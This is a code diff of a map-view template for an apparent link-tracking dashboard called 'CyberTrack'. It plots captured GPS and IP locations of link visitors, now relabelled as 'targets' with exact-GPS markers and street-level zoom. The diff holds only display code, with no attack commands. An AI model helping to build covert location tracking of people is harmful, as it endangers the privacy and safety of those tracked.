@@ -1,5 +1,5 @@
 {% extends "base.html" %}
-{% block title %}Map View — CyberTrack{% endblock %}
+{% block title %}Map View — CyberTrack Intelligence{% endblock %}
 
 {% block head %}
 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
@@ -7,25 +7,25 @@
 
 {% block content %}
 <div class="mb-4 flex items-center gap-4 flex-wrap">
-  <a href="/dashboard/logs/{{ link_id }}" class="text-gray-500 hover:text-white text-sm transition">← Logs</a>
-  <h1 class="text-xl font-bold gradient-text">Location Map</h1>
-  <span class="text-gray-600 text-sm">({{ points|length }} point{{ 's' if points|length != 1 else '' }})</span>
+  <a href="/dashboard/logs/{{ link_id }}" class="text-gray-500 hover:text-white text-sm transition">← Back to Logs</a>
+  <h1 class="text-xl font-bold gradient-text">Target Location Map</h1>
+  <span class="text-gray-500 text-sm">({{ points|length }} geo-position{{ 's' if points|length != 1 else '' }})</span>
 </div>
 
 <!-- Legend & Controls -->
 <div class="flex items-center gap-4 mb-4 flex-wrap">
-  <div class="flex gap-4 text-xs text-gray-400">
-    <span class="flex items-center gap-1.5">
-      <span class="w-3 h-3 rounded-full bg-green-500 inline-block shadow-lg shadow-green-500/30"></span> GPS (exact)
+  <div class="flex gap-4 text-xs text-gray-300">
+    <span class="flex items-center gap-1.5 font-semibold">
+      <span class="w-3.5 h-3.5 rounded-full bg-emerald-500 inline-block shadow-lg shadow-emerald-500/50 border border-white"></span> 🟢 Exact GPS (±3–15m)
     </span>
     <span class="flex items-center gap-1.5">
-      <span class="w-3 h-3 rounded-full bg-blue-400 inline-block"></span> IP (approximate)
+      <span class="w-3.5 h-3.5 rounded-full bg-blue-500 inline-block border border-white"></span> 🔵 IP Geolocation (ISP Hub)
     </span>
   </div>
   <div class="ml-auto flex gap-2">
-    <button onclick="setTile('dark')" id="btn-dark" class="text-xs glass px-3 py-1.5 rounded-lg text-white transition hover:bg-white/10">🌙 Dark</button>
-    <button onclick="setTile('street')" id="btn-street" class="text-xs glass px-3 py-1.5 rounded-lg text-gray-400 transition hover:bg-white/10">🗺️ Street</button>
-    <button onclick="setTile('satellite')" id="btn-satellite" class="text-xs glass px-3 py-1.5 rounded-lg text-gray-400 transition hover:bg-white/10">🛰️ Satellite</button>
+    <button onclick="setTile('street')" id="btn-street" class="text-xs glass px-3 py-1.5 rounded-lg text-emerald-400 font-semibold transition hover:bg-white/10">🗺️ Street Map</button>
+    <button onclick="setTile('satellite')" id="btn-satellite" class="text-xs glass px-3 py-1.5 rounded-lg text-gray-400 transition hover:bg-white/10">🛰️ Satellite View</button>
+    <button onclick="setTile('dark')" id="btn-dark" class="text-xs glass px-3 py-1.5 rounded-lg text-gray-400 transition hover:bg-white/10">🌙 Dark Mode</button>
     <button onclick="toggleHeat()" id="btn-heat" class="text-xs glass px-3 py-1.5 rounded-lg text-gray-400 transition hover:bg-white/10">🔥 Heatmap</button>
   </div>
 </div>
@@ -33,12 +33,12 @@
 {% if not points %}
 <div class="glass rounded-2xl p-16 text-center">
   <div class="text-4xl mb-3 opacity-30">🗺️</div>
-  <p class="text-gray-600 text-sm">No location data available for this link.</p>
+  <p class="text-gray-500 text-sm">No location coordinates recorded yet for this target link.</p>
 </div>
 {% else %}
 
 <!-- Map container -->
-<div id="map" class="rounded-2xl overflow-hidden border border-gray-800/50" style="height: 560px;"></div>
+<div id="map" class="rounded-2xl overflow-hidden border border-gray-800/80 shadow-2xl" style="height: 600px;"></div>
 
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script src="https://unpkg.com/leaflet.heat@0.2.0/dist/leaflet-heat.js"></script>
@@ -48,70 +48,82 @@
 
   const map = L.map('map', { zoomControl: true });
 
-  // Tile layers
+  // High resolution Tile layers
   const tiles = {
-    dark: L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
-      attribution: '&copy; CartoDB', maxZoom: 19
-    }),
     street: L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
       attribution: '&copy; OpenStreetMap', maxZoom: 19
     }),
     satellite: L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
       attribution: '&copy; Esri', maxZoom: 19
+    }),
+    dark: L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+      attribution: '&copy; CartoDB', maxZoom: 19
     })
   };
 
-  let currentTile = 'dark';
-  tiles.dark.addTo(map);
+  let currentTile = 'street';
+  tiles.street.addTo(map);
 
   function setTile(name) {
     map.removeLayer(tiles[currentTile]);
     tiles[name].addTo(map);
     currentTile = name;
     document.querySelectorAll('[id^="btn-dark"],[id^="btn-street"],[id^="btn-satellite"]').forEach(function(b) {
-      b.classList.remove('text-white'); b.classList.add('text-gray-400');
+      b.classList.remove('text-emerald-400', 'font-semibold');
+      b.classList.add('text-gray-400');
     });
-    document.getElementById('btn-' + name).classList.remove('text-gray-400');
-    document.getElementById('btn-' + name).classList.add('text-white');
+    const active = document.getElementById('btn-' + name);
+    if (active) {
+      active.classList.remove('text-gray-400');
+      active.classList.add('text-emerald-400', 'font-semibold');
+    }
   }
 
-  // Custom icons
+  // Custom GPS & IP markers
   const gpsIcon = L.divIcon({
     className: '',
-    html: '<div style="width:14px;height:14px;background:#22c55e;border:2px solid #fff;border-radius:50%;box-shadow:0 0 8px rgba(34,197,94,0.7)"></div>',
-    iconSize: [14, 14], iconAnchor: [7, 7]
+    html: '<div style="width:16px;height:16px;background:#10b981;border:2.5px solid #fff;border-radius:50%;box-shadow:0 0 12px #10b981"></div>',
+    iconSize: [16, 16], iconAnchor: [8, 8]
   });
 
   const ipIcon = L.divIcon({
     className: '',
-    html: '<div style="width:12px;height:12px;background:#60a5fa;border:2px solid #fff;border-radius:50%;opacity:0.85"></div>',
-    iconSize: [12, 12], iconAnchor: [6, 6]
+    html: '<div style="width:14px;height:14px;background:#3b82f6;border:2px solid #fff;border-radius:50%;box-shadow:0 0 8px #3b82f6"></div>',
+    iconSize: [14, 14], iconAnchor: [7, 7]
   });
 
   const bounds = [];
   const heatData = [];
+  let hasGps = false;
 
   points.forEach(function(p, i) {
-    const icon = p.source === 'GPS' ? gpsIcon : ipIcon;
+    const isGps = p.source === 'GPS';
+    if (isGps) hasGps = true;
+
+    const icon = isGps ? gpsIcon : ipIcon;
     const marker = L.marker([p.lat, p.lng], { icon: icon }).addTo(map);
+    
     marker.bindPopup(
-      '<div style="font-family:Inter,monospace;font-size:12px;line-height:1.6;color:#111;min-width:160px">' +
-        '<strong style="color:#ef4444">#' + (i + 1) + '</strong> · <span style="background:' + (p.source === 'GPS' ? '#dcfce7;color:#166534' : '#dbeafe;color:#1e40af') + ';padding:1px 6px;border-radius:4px;font-size:10px">' + p.source + '</span><br>' +
-        p.label.replace(/\|/g, '<br>') +
+      '<div style="font-family:Inter,sans-serif;font-size:12px;line-height:1.5;color:#1e293b;min-width:180px">' +
+        '<div style="font-weight:bold;color:#ef4444;margin-bottom:4px">Target Capture #' + (i + 1) + '</div>' +
+        '<div style="display:inline-block;padding:2px 8px;border-radius:6px;font-size:10px;font-weight:bold;' +
+        (isGps ? 'background:#dcfce7;color:#166534;' : 'background:#dbeafe;color:#1e40af;') + '">' +
+        (isGps ? '📍 Exact Hardware GPS' : '🔵 IP Geolocation Hub') + '</div>' +
+        '<div style="margin-top:6px;color:#334155;font-size:11px">' + p.label.replace(/\|/g, '<br>') + '</div>' +
+        '<a href="https://maps.google.com/?q=' + p.lat + ',' + p.lng + '" target="_blank" style="display:inline-block;margin-top:6px;color:#2563eb;font-weight:bold;font-size:11px">Open in Google Maps →</a>' +
       '</div>'
     );
     bounds.push([p.lat, p.lng]);
     heatData.push([p.lat, p.lng, 1]);
 
     // Accuracy circle for GPS points
-    if (p.source === 'GPS' && p.accuracy) {
+    if (isGps && p.accuracy) {
       L.circle([p.lat, p.lng], {
         radius: p.accuracy,
-        color: '#22c55e',
-        fillColor: '#22c55e',
-        fillOpacity: 0.08,
-        weight: 1,
-        opacity: 0.3
+        color: '#10b981',
+        fillColor: '#10b981',
+        fillOpacity: 0.15,
+        weight: 1.5
       }).addTo(map);
     }
   });
@@ -130,21 +142,21 @@
     }
     if (heatVisible) {
       map.removeLayer(heatLayer);
-      btn.classList.remove('text-orange-400');
+      btn.classList.remove('text-orange-400', 'font-semibold');
       btn.classList.add('text-gray-400');
     } else {
       heatLayer.addTo(map);
       btn.classList.remove('text-gray-400');
-      btn.classList.add('text-orange-400');
+      btn.classList.add('text-orange-400', 'font-semibold');
     }
     heatVisible = !heatVisible;
   }
 
-  // Fit map to bounds
+  // Smart Zoom
   if (bounds.length === 1) {
-    map.setView(bounds[0], 10);
+    map.setView(bounds[0], hasGps ? 16 : 11);
   } else if (bounds.length > 1) {
-    map.fitBounds(bounds, { padding: [40, 40] });
+    map.fitBounds(bounds, { padding: [50, 50] });
   }
 </script>
 {% endif %}
